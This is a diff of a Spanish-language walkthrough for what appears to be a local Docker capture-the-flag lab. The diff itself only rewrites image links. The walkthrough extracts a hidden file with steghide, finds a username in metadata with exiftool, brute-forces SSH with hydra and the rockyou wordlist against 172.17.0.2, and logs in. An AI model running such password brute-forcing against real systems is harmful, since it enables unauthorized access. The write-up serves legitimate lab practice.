@@ -61,14 +61,14 @@ Nos descargamos la imagen y veremos si tiene algún archivo oculto. Haremos el s
 steghide extract -sf imagen.jpeg
 ```
 
-![[Pasted image 20240917193813.png]]
+![Img](./images/Pasted%20image%2020240917193813.png)
+
 
 ```
 cat secreto.txt
 ```
 
-
-![[Pasted image 20240917193842.png]]
+![Img](./images/Pasted%20image%2020240917193842.png)
 
 
 Lo cual nos da una pista. Buscaremos  más información dentro de esta imagen como son los metadatos , usaremos `exiftool`, por lo cual usando el comando 
@@ -76,8 +76,7 @@ Lo cual nos da una pista. Buscaremos  más información dentro de esta imagen co
 ```
 exiftool imagen.jpeg
 ```
-
-![[Pasted image 20240917194039.png]]
+![Img](./images/Pasted%20image%2020240917194039.png)
 
 Y ahí tenemos un usuario `borazuwarah`
 
@@ -86,13 +85,12 @@ Ahora fuerza bruta.
 ```
 hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
-
-![[Pasted image 20240917194231.png]]
+![Img](./images/Pasted%20image%2020240917194231.png)
 
 ```
 ssh borazuwarah@172.17.0.2
 ```
+![Img](./images/Pasted%20image%2020240917194342.png)
 
-![[Pasted image 20240917194342.png]]
 
 Y ya estamos adentro. 
